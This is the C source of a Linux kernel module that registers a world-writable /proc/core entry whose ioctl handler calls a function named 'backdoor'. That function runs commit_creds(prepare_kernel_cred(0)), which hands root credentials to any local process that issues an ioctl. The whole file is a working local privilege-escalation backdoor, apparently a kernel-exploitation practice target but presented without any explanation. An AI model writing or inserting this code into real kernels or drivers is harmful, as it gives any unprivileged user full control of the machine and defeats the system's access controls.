#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
//#include <linux/device.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/sched.h>


struct proc_dir_entry * core_proc ;
void backdoor(void)
{
	commit_creds(prepare_kernel_cred(0));

}
static long core_ioctl(struct file *fd, unsigned int a2,unsigned long  a3)
{
	backdoor();
	return 0;
}

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = core_ioctl,
};

static int core_init(void) {
	core_proc = proc_create("core", 438LL, 0LL, &fops);
	return 0;
}

static void core_exit(void) {
	if ( core_proc ){
		proc_remove(core_proc);
	}

}

module_init(core_init);
module_exit(core_exit);

MODULE_LICENSE("GPL");


